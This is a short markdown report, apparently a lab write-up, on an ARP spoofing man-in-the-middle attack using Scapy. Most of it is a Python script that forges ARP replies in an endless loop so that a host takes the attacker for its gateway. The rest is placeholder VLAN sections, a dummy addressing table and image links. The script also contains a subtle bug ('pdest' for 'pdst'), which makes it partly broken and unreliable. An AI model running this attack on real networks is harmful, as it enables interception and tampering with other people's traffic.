# ARP MITM with Scapy

## Script

```python
# Here is a sample Python script that performs ARP spoofing and MITM attack using Scapy:
import scapy.all as scapy

def get_mac(ip):
    arp_request = scapy.ARP(pdest=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

# Function to perform ARP spoofing

def arp_spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(arp_response, verbose=False)

# Example usage

while True:
    arp_spoof('192.168.1.10', '192.168.1.1')  # Spoofing the target IP
```

## VLANs
### VLAN 10
Details about VLAN 10...

### VLAN 20
Details about VLAN 20...

### VLAN 30
Details about VLAN 30...

## Addressing Tables
| Device      | IP Address    | MAC Address       |
|-------------|---------------|-------------------|
| Router      | 192.168.1.1   | AA:BB:CC:DD:EE:FF |
| PC1        | 192.168.1.10  | 11:22:33:44:55:66 |
| PC2        | 192.168.1.20  | 77:88:99:00:AA:BB |

## Evidence Images
![Evidence 1](images/evidence1.png)
![Evidence 2](images/evidence2.png)

## Conclusion
This document details the ARP MITM attack using Scapy, outlining the script and its configuration without including external references.